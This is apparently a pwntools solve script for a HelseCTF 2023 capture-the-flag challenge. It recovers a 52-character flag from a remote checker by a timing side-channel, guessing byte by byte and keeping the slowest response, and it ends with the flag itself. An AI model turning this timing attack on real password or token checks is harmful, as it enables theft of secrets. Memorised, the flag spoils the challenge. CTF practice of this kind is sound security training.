from pwn import *
import time
io = remote("helsectf2023-6ac4e1c6d8855c1bd96a-eksponentiell_sjekk.chals.io", 443, ssl=True)
io.recvuntil(b"flagget?").decode() # Wait until it's asking for at test flag

flagLength = 52

testBytes = bytearray([0xFF]*flagLength) # Fill with high nubmer byte (0xFF, 255)
allowedCharacters = list((string.ascii_letters + string.digits + string.punctuation).encode())

for i in range(0, flagLength+1):
    currentGuess = 0
    currentGuessTime = 0
    for nextByte in allowedCharacters:
        testBytes[i] = nextByte
        line = testBytes.hex().encode()

        # First check
        start = time.time()
        io.sendline(line)
        io.recvuntil(b"flagget?", timeout = 10)
        end1 = round((time.time() - start) * 1000)
        end2 = 1000
        if end1 > 110: 
            # Sanity check
            start = time.time()
            io.sendline(line)
            io.recvuntil(b"flagget?", timeout = 10)
            end2 = round((time.time() - start) * 1000)

        end = end1 if end1 < end2 else end2

        if currentGuessTime < end:
            currentGuess = nextByte
            currentGuessTime = end

    testBytes[i] = currentGuess
    print(i, chr(currentGuess), currentGuessTime)


print()
print(testBytes.decode())


# helsectf{f@il_Fas7_a|g0ritmeR_k4N_L3Kke_1NfOrM45j0n}